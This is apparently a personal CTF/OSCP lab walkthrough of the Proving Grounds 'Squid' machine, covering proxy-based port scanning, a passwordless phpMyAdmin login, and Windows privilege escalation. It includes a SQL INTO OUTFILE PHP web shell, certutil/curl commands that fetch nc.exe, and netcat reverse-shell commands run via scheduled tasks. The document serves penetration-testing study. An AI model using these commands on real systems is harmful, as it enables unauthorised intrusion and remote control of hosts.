# Squid Walkthrough
Name: Squid
Date:  22/09/2022
Difficulty:  Easy
Goals:  OSCP Prep 4/5 machines a day testing (can use walkthrough)
Learnt: 
- I MUST try all of the solutions on a page before moving from a source to extention to one of the solutions on the page. nmap then spose
- Into Outfile mysql shell with php
- nt \\system is may not be full system

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128. Prep the `-Pn`
![ping](OS-ProvingGrounds/Squid/Screenshots/ping.png)

One port machine, ran UDP as I normally do - was none anyway , greeted with this webpage

![](weirdness.png)
host (squid/3.1.9)
nmap says 4.14...
source code on webpage say: Generated Thu, 22 Sep 2022 10:56:47 GMT by SQUID (squid/4.14)

Askes for email web

Nuclei
```
Copyright (C) 1996-2021 The Squid Software Foundation 
```

[Hacktrick Squid Protocol Page](https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid?q=3128)

![](curl-proxy.png)

It is windows machine

[4.14 exploit](https://packetstormsecurity.com/files/161563/Squid-4.14-5.0.5-Code-Execution-Double-Free.html) to consider


Used hint Foothold:
A phpMyAdmin web service can logged into with deafult credentials and "INTO OUTFILE" can be abused to gain a foothold.

proxychaining through I missed from the article; then should have masscan initially...masscan has its own tcp stack and is not compatible with proxychains
[hackwhackandsmack](https://www.hackwhackandsmack.com/?p=1021)
```bash
seq 1 10000 | xargs -P 50 -I{} proxychains nmap -p {} -sT -Pn --open -n --min-rate 1 --oG proxychains_nmap --append-output localhost
```
I tuned the above down, then tried `0 65535` and nothing..

Then:
```bash
proxychains nmap -sT -oA nmap/proxychained-localhost-st --min-rate 1000 -F localhost
# None open
```

Going to return to this when I am reading and see if its a weird port. Decided I think I either am doing something really wrong proxying through or tooling. Tested nmap with walkthrough on hand. But [spose](https://github.com/aancw/spose)

```
# Nmap 7.92 scan initiated Thu Sep 22 21:59:00 2022 as: nmap -sC -sV -oN solution-testing-3306-8080 -p 3306,8080 localhost
Nmap scan report for localhost (127.0.0.1)
Host is up (0.13s latency).

PORT     STATE  SERVICE    VERSION
3306/tcp closed mysql
8080/tcp closed http-proxy

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 22 21:59:01 2022 -- 1 IP address (1 host up) scanned in 0.62 seconds
```

![](spose.png)



![](wampserver.png)

## Exploit
Root and no password...
![900](rootnopasss.png)

You can alter the SQL and serve a file.php?cmd=RCE!

## Foothold

SQL into outfile Shell
```sql
-- PHP
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
curl "http://$ip/shell.php?cmd=whoami"

curl "http://$ip/shell.php?cmd=certutil+-urlcache+-f+http://$ip/nc.exe+nc.exe"
curl "http://127.0.0.1:8080/shell.php?cmd=nc.exe+$ip+4444+-e+powershell.exe"
```

## PrivEsc

Although the walkthrough points out a different PrivEsc
![](powerup-diversion.png)

Played around and fail to make work.
```powershell
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe $ip 4444 -e cmd.exe`""
Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"
Start-ScheduledTask -TaskName "GrantPerm"
# Catch reverse shell
# We may lack some privileges
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseWorkingSetPrivilege"
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs
# Catch another shell
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe $ip 4444 -e cmd.exe`""
# Register SchedueledTask
Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal
# Start Task
Start-ScheduledTask -TaskName "GrantAllPerms"
```

Finallly
![](finalprivesc.png)